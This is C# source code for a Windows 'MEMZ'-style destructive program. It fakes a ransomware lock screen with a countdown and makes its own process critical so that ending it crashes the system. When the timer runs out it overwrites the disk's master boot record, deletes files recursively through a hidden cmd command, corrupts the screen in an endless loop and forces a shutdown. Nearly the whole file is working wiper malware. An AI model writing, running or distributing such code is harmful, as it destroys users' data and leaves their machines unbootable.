using System;
using System.Drawing;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace DangerousMemz
{
    class Program : Form
    {
        [DllImport("kernel32.dll")] static extern IntPtr CreateFile(string lp, uint da, uint sm, IntPtr sa, uint cd, uint fa, IntPtr h);
        [DllImport("kernel32.dll")] static extern bool WriteFile(IntPtr h, byte[] b, uint n, out uint w, IntPtr o);
        [DllImport("ntdll.dll")] static extern int NtSetInformationProcess(IntPtr h, int c, ref int i, int l);
        [DllImport("gdi32.dll")] static extern bool BitBlt(IntPtr hdcD, int x, int y, int w, int h, IntPtr hdcS, int xs, int ys, int r);
        [DllImport("user32.dll")] static extern IntPtr GetDC(IntPtr h);

        private int timeLeft = 600; 
        private Label lblTimer;
        private TextBox txtKey;

        [STAThread]
        static void Main()
        {
            // 1. SCARY WARNINGS
            if (MessageBox.Show("WARNING: This is a high-risk application.\nRunning this will cause permanent system damage.\n\nContinue?", "CRITICAL ALERT", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) != DialogResult.Yes) return;
            if (MessageBox.Show("FINAL WARNING: ALL DATA WILL BE WIPED.\nThis is your last chance to cancel.\n\nExecute?", "SYSTEM DESTRUCTION", MessageBoxButtons.YesNo, MessageBoxIcon.Error) != DialogResult.Yes) return;

            Application.EnableVisualStyles();

            // 2. MAKE PROCESS CRITICAL (THIS TRIGGERS THE RED WINDOWS WARNINGS)
            // If the user tries to stop the process, the PC will Blue Screen (BSOD).
            try 
            { 
                int isCritical = 1; 
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, 4); 
            } 
            catch {}

            Application.Run(new Program());
        }

        public Program()
        {
            this.Text = "CRITICAL SYSTEM FAILURE";
            this.Size = new Size(800, 450);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = Color.Maroon; // Dangerous Red Background
            this.ForeColor = Color.White;
            this.FormBorderStyle = FormBorderStyle.None;
            this.TopMost = true;

            lblTimer = new Label() { Text = "10:00", Font = new Font("Consolas", 60, FontStyle.Bold), ForeColor = Color.Yellow, Location = new Point(250, 50), Size = new Size(300, 100) };
            
            Label lblInfo = new Label() { Text = "SYSTEM ENCRYPTED. ENTER MASTER KEY OR WAIT FOR WIPE:", Location = new Point(150, 200), Size = new Size(500, 25), Font = new Font("Arial", 12, FontStyle.Bold), TextAlign = ContentAlignment.MiddleCenter };
            txtKey = new TextBox() { Location = new Point(250, 240), Width = 300, Font = new Font("Arial", 16), BackColor = Color.Black, ForeColor = Color.Red };
            
            Button btnVerify = new Button() { Text = "UNLOCK", Location = new Point(560, 238), Size = new Size(100, 35), FlatStyle = FlatStyle.Flat, BackColor = Color.Black, ForeColor = Color.White };
            btnVerify.Click += (s, e) => {
                if (txtKey.Text == "MC-FREE-2026-X") {
                    // Turn off critical status before exiting to avoid BSOD
                    int isNotCritical = 0;
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isNotCritical, 4);
                    MessageBox.Show("Decryption Successful.", "Safe Exit");
                    Environment.Exit(0);
                } else {
                    MessageBox.Show("INVALID KEY. DESTRUCTION ACCELERATED.", "THREAT DETECTED", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    timeLeft -= 60; // Remove 1 minute for wrong key
                }
            };

            // HIDDEN DOT (Bottom-Left)
            Button btnDestroyNow = new Button() { Text = ".", Location = new Point(0, 430), Size = new Size(20, 20), FlatStyle = FlatStyle.Flat, ForeColor = Color.Maroon, BackColor = Color.Maroon, FlatAppearance = { BorderSize = 0 } };
            btnDestroyNow.Click += (s, e) => { timeLeft = 0; };

            this.Controls.AddRange(new Control[] { lblTimer, lblInfo, txtKey, btnVerify, btnDestroyNow });

            System.Windows.Forms.Timer t = new System.Windows.Forms.Timer() { Interval = 1000 };
            t.Tick += (s, e) => {
                if (timeLeft > 0) {
                    timeLeft--;
                    lblTimer.Text = TimeSpan.FromSeconds(timeLeft).ToString(@"mm\:ss");
                } else {
                    t.Stop();
                    ExecuteDestruction();
                }
            };
            t.Start();
        }

        void ExecuteDestruction()
        {
            // MBR KILL
            try {
                uint w;
                IntPtr h = CreateFile("\\\\.\\PhysicalDrive0", 0x10000000, 1|2, IntPtr.Zero, 3, 0, IntPtr.Zero);
                WriteFile(h, new byte[512], 512, out w, IntPtr.Zero);
            } catch {}

            // FILE KILLER
            Process.Start(new ProcessStartInfo("cmd.exe", "/c taskkill /f /im explorer.exe & del /s /q /f *.*") { WindowStyle = ProcessWindowStyle.Hidden });

            // GDI RAVE
            Thread gdi = new Thread(() => {
                Random r = new Random();
                IntPtr hdc = GetDC(IntPtr.Zero);
                while(true) {
                    BitBlt(hdc, r.Next(-20, 20), r.Next(-20, 20), 2000, 2000, hdc, 0, 0, 0x00990066);
                    Thread.Sleep(10);
                }
            });
            gdi.Start();

            // SHUTDOWN
            Process.Start("shutdown", "/s /t 300 /c \"PC saying BYE BYE\"");
            this.Controls.Clear();
            Label bye = new Label() { Text = "BYE BYE", Font = new Font("Impact", 100), ForeColor = Color.White, Dock = DockStyle.Fill, TextAlign = ContentAlignment.MiddleCenter };
            this.Controls.Add(bye);
        }
    }
}
